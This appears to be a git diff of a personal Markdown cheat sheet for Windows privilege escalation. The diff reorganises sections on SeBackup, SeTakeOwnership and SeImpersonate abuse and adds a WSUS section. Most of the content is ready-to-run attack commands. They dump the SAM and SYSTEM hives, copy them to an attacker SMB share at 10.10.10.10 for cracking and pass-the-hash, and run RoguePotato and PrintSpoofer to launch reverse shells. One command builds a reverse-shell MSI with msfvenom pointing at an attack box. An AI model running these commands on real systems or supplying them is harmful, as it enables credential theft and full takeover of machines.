@@ -68,9 +68,44 @@ while(1) { cat index.html | nc -w1 -l -p 8080 }
 
 # Escalation Vectors
 
-## Whoami /priv
-
+## Whoami /priv & SePrivileges
+[Whoami Priv2Admin Definitive List](https://github.com/gtworek/Priv2Admin)
 [Whoami /priv SeImpersonate Privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+
+From the `whoami /priv` privileges can be displayed.
+
+- **SeBackUp / SeRestore**
+SeBackup and SeRestore privileges allow users to read and write to any file in the system, bypass DACL. PrivEsc be backuping SAM and SYSTEM hives
+```batch
+reg save hklm\system C:\path\to\exfil\out\from
+reg save hklm\sam C:\path\to\exfil\out\from
+```
+Use [[Impacket-Cheatsheet]], smbshare  to `copy` or `xcopy`  or `move` the hives your smb share. Then perform a [[Pass-The-Hash]] with Adminstrators hash.
+
+- **SeTakeOwnership**
+SeTakeOwnship allows file ownership transference to then `icacls` to grant full permissions over that file, replace with cmd.exe to PrivEsc:
+```batch
+takeown /f C:\path\to\an.exe
+icalcs C:\path\to\an.exe /grant <CurrentUser>:f
+copy C:\path\to\cmd.exe C:\path\to\an.exe
+```
+- **SeImpersonate / SeAssignPrimaryToken**
+SeImpersonate and SeAssignPrimaryToken abuse consists of ability to spawn a process or thread under a different user's security context. 
+
+#### Rogue Potato - Token Impersonation
+```
+sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
+C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
+C:\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999 # in local service reverse shell run exploit
+``` 
+
+#### PrintSpoofer - Token Impersonation
+```
+C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
+C:\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i # in local service reverse shell run exploit
+```
+[PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases)
+
 
 ## SPN map
 ```powershell
@@ -232,7 +267,7 @@ cacls "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\U
 cacls "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users"
 ```
 
-# Autorun executables
+## Autorun executables
 ```powershell
 # WARNING
 # BEWARE
@@ -245,7 +280,7 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y # 
 # restart system
 ```
 
-# AlwaysInstalledElevated
+## AlwaysInstalledElevated
 ```powershell
 # Some PrivEsc related material online does not include the /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # Query Both
@@ -258,7 +293,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKBOX LPORT=$PORT -f msi -o
 msiexec /quiet /qn /i C:\Windows\Temp\reverse.msi 
 ```
 
-# Backup SAM and SYSTEM files
+## Backup SAM and SYSTEM files
 ```
 copy C:\Windows\Repair\SAM \\10.10.10.10\kali\ # These can often be transfered and cracked
 copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
@@ -267,7 +302,7 @@ pip3 install pycrypto
 python3 creddump7/pwdump.py SYSTEM SAM
 ```
 
-# Passwords in the registry
+## Passwords in the registry
 ```
 reg query HKLM /f password /t REG_SZ /s
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" # For admin autologons!
@@ -412,7 +447,7 @@ Start-ScheduledTask -TaskName "GrantAllPerms"
 echo reverseShell.exe >> C:\ScheduleTask.ps1 # append .exe
 ```
 
-# Insecure GUI Apps
+## Insecure GUI Apps
 ```
 tasklist /V # GUI apps that can be run as Admin 
 # In file dialogue box 
@@ -454,41 +489,17 @@ sc stop dllsvc
 sc start dllsvc # Or start a service that use it.
 ```
 
-## SePrivileges
-From the `whoami /priv` privileges can be displayed.
-
-- **SeBackUp / SeRestore**
-SeBackup and SeRestore privileges allow users to read and write to any file in the system, bypass DACL. PrivEsc be backuping SAM and SYSTEM hives
-```batch
-reg save hklm\system C:\path\to\exfil\out\from
-reg save hklm\sam C:\path\to\exfil\out\from
+## WSUS
+If updates are run via http, not https:
+```powershell
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+# If you get:
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+	WUServer REG_SZ http:// # Some http server! 
+# AND
+HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer # == 1 
 ```
-Use [[Impacket-Cheatsheet]], smbshare  to `copy` or `xcopy`  or `move` the hives your smb share. Then perform a [[Pass-The-Hash]] with Adminstrators hash.
-
-- **SeTakeOwnership**
-SeTakeOwnship allows file ownership transference to then `icacls` to grant full permissions over that file, replace with cmd.exe to PrivEsc:
-```batch
-takeown /f C:\path\to\an.exe
-icalcs C:\path\to\an.exe /grant <CurrentUser>:f
-copy C:\path\to\cmd.exe C:\path\to\an.exe
-```
-- **SeImpersonate / SeAssignPrimaryToken**
-SeImpersonate and SeAssignPrimaryToken abuse consists of ability to spawn a process or thread under a different user's security context. 
-
-#### Rogue Potato - Token Impersonation
-```
-sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
-C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
-C:\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999 # in local service reverse shell run exploit
-``` 
-
-#### PrintSpoofer - Token Impersonation
-```
-C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
-C:\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i # in local service reverse shell run exploit
-```
-[PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases)
-
+Use: [wsuxploit](https://github.com/pimps/wsuxploit) or [pywsus](https://github.com/GoSecure/pywsus)
 
 
 ## Powershell downgrade
